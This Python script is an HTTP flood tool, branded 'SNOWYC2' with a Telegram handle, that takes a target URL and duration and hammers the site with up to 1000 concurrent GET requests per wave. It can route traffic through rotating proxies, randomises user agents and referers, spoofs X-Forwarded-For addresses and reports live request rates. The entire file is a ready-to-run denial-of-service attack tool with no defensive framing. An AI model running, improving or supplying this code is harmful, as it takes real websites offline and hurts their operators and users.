import asyncio
import time
import random
import sys
import os
import aiohttp
import httpx

def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")
PROXIES = load_lines("STS.txt")

REQUEST_TIMEOUT = 10
PROXY_CONCURRENT = 50
NORM_CONCURRENT = 1000

class AttackEngine:
    def __init__(self, target, duration, use_proxies):
        self.target = target
        self.duration = duration
        self.use_proxies = use_proxies
        self.start_time = time.time()
        self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
        self.max_concurrent = PROXY_CONCURRENT if use_proxies else NORM_CONCURRENT
        self.proxy_index = 0

    def update_stats(self, results):
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.start_time
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    def next_proxy(self):
        if not PROXIES:
            return None
        proxy = PROXIES[self.proxy_index % len(PROXIES)]
        self.proxy_index += 1
        return f"http://{proxy}"

    def headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0",
            "Referer": random.choice(REFERERS) if REFERERS else "https://google.com",
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

    async def req_proxy(self, session):
        headers = self.headers()
        proxy = self.next_proxy()
        try:
            async with session.get(self.target, headers=headers, proxy=proxy) as resp:
                return "SUCCESS" if resp.status == 200 else "ERROR"
        except:
            return "ERROR"

    async def req_http2(self, client):
        headers = self.headers()
        try:
            r = await client.get(self.target, headers=headers)
            return "SUCCESS" if r.status_code == 200 else "ERROR"
        except:
            return "ERROR"

    async def run_attack(self):
        if self.use_proxies:
            conn = aiohttp.TCPConnector(ssl=False, limit=None)
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
                while time.time() - self.start_time < self.duration:
                    tasks = [self.req_proxy(session) for _ in range(self.max_concurrent)]
                    results = await asyncio.gather(*tasks)
                    self.update_stats(results)
                    self.print_status()
        else:
            limits = httpx.Limits(max_connections=self.max_concurrent)
            async with httpx.AsyncClient(http2=True, timeout=REQUEST_TIMEOUT, limits=limits, verify=False) as client:
                while time.time() - self.start_time < self.duration:
                    tasks = [self.req_http2(client) for _ in range(self.max_concurrent)]
                    results = await asyncio.gather(*tasks)
                    self.update_stats(results)
                    self.print_status()
        self.print_summary()

    def print_status(self):
        os.system("clear" if os.name != "nt" else "cls")
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: C-ECLIPSE | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f"TIME LEFT: {remaining:.1f}s")
        print("=" * 60)

    def print_summary(self):
        elapsed = time.time() - self.start_time
        avg_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {elapsed:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS: {self.stats['success']}")
        print(f"ERRORS: {self.stats['errors']}")
        print(f"AVG RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid time.")
        return
    use_proxies = input("USE PROXIES? (y/n): ").lower() == "y"

    engine = AttackEngine(target, duration, use_proxies)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
